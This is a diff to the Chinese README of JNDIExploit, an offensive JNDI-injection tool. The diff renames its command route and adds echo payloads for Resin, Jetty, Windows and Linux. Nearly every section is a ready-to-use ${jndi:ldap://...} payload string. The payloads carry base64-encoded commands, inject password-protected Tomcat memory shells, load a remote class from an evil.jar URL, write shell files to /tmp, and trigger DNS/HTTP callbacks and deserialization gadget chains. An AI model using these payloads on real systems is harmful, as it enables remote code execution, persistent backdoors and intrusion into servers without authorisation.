@@ -26,24 +26,49 @@ Usage: java -jar JNDIExploit-[version].jar [options]
 ```
 
 * 目前支持的所有 ```PayloadType``` 为
-    * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
     * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami```
       的方式传递想要执行的命令
     * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
       时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
     * ```JbossEcho```: Jboss 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-    * ```WeblogicEcho```: weblogicEcho 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-    * ```WebsphereEcho```: websphereecho 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+    * ```WeblogicEcho```: weblogic 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+    * ```WebsphereEcho```: websphere 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+    * ```ResinEcho```: Resin 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+    * ```JettyEcho```: Jetty7,8,9版本命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
+    * ```WindowsEcho```: Windows 命令执行回显, 只执行了whoami
+    * ```LinuxEcho1```: Linux 命令执行回显, 只执行了id，
+      + 原理是遍历当前进程 fd 目录下的所有和 socket 相关的 fd 文件，并输出结果;
+      + 缺陷：1. 会影响同一时间点所有访问网站的用户（也会看到自定义回显的结果）; 2. 8次左右有可能导致应用崩溃 
+    * ```LinuxEcho2```: Linux 命令执行回显, 只执行了id
+      + 原理：通过延迟等方法来确定唯一正确的 fd 文件;
+      + 不会影响访问网站的其他用户，也不会导致应用崩溃;
     * ```AllEcho```: 自动选择命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-    * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
+    * ```qi4l```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
 
++ 直接命令执行示例：
 ```
 {{url
-  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/nu1r/Base64/{{base64
+  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/qi4l/Base64/{{base64
       (ping xxx.dnstunnel.run)
   }}})
 }}
 ```    
+
++ Echo示例：
+```
+{{url
+    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho})
+}}
+
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Basic/TomcatEcho})
+}}
+```
+
+效果图：
+
+![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230627112538.png)
 
 - 支持tomcatBypass路由直接上线msf：
 
@@ -80,11 +105,16 @@ Usage: java -jar JNDIExploit-[version].jar [options]
 - h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持 SpringControllerMS
 - ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/
 
-示例
++ 内存马使用示例：
 
-```shell
+```go
+// 加参数
 {{url
-    (${jndi:ldap://111.229.10.212:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn})
+    (${jndi:ldap://0.0.0.0:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn})
+}}
+// 默认加载
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Basic/tomcatfilterjmx/shell})
 }}
 ```
 
@@ -124,7 +154,7 @@ TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/qi4l/Base64/{{base64
         (TS-10)
     }}})
 }}
@@ -137,7 +167,7 @@ RC ：Remote Call - 通过 URLClassLoader.loadClass()
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/qi4l/Base64/{{base64
         (RC-http://xxxx.com/evil.jar#EvilClass)
     }}})
 }}
@@ -147,7 +177,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/qi4l/Base64/{{base64
         (WF-/tmp/shell#123)
     }}})
 }}
@@ -157,7 +187,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/qi4l/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -177,7 +207,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/C3P04/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/C3P04/qi4l/Base64/{{base64
         ([base64_encoded_cmd])
     }}})
 }}
@@ -207,7 +237,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/qi4l/Base64/{{base64
         (CC:commonscollections6:{{base64
             (open -a Calculator.app)
         }}1::10000)
@@ -297,7 +327,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-  (${jndi:ldap://0.0.0.0:1389/Deserialization/[GadgetType]/nu1r/Base64/{{base64
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/[GadgetType]/qi4l/Base64/{{base64
       (base64_encoded_cmd#-a -o)
   }}})
 }}
@@ -323,7 +353,7 @@ TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (TS-10)
     }}})
 }}
@@ -334,7 +364,7 @@ RC ：Remote Call - 通过 URLClassLoader.loadClass()
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (RC-http://xxxx.com/evil.jar#EvilClass)
     }}})
 }}
@@ -344,7 +374,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (WF-/tmp/shell#d2hvYW1p)
     }}})
 }}
@@ -355,7 +385,7 @@ PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)
     }}})
 }}
@@ -366,7 +396,7 @@ SE-d2hvYW1
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (SE-d2hvYW1)
     }}})
 }}
@@ -376,7 +406,7 @@ DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用�
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (DL-xxxdnslog.cn)
     }}})
 }}
@@ -386,7 +416,7 @@ HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-ht
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (HL-http://xxx.com)
     }}})
 }}
@@ -396,7 +426,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (BC-$BCEL$xxx)
     }}})
 }}
@@ -406,7 +436,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/qi4l/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -418,7 +448,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/qi4l/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -437,7 +467,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/nu1r/Base64/{{base64
+  (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections3/qi4l/Base64/{{base64
       (LF#/tmp/evil.class-org)
   }}})
 }}
@@ -458,7 +488,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/qi4l/Base64/{{base64
         (all:xxxxxx.dns.log)
     }}})
 }}
@@ -492,7 +522,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/自定义链子的类名/nu1r/Base64/{{base64
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/自定义链子的类名/qi4l/Base64/{{base64
         (whoami)
     }}})
 }}
@@ -502,7 +532,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 
 在 `com.nu1r.jndi.template` 下新建 JAVA 文件并将主要实现方法写在静态代码块中。
 
-额外方法与 shell 通过 javassist 引入 `com.nu1r.jndi.template.shell.MemShellPayloads`(最小化有效负载的大小)
+额外方法与 shell 通过 javassist 引入 `com.qi4l.jndi.template.shell.MemShellPayloads`(最小化有效负载的大小)
 
 使用与上面内存马使用一致
 
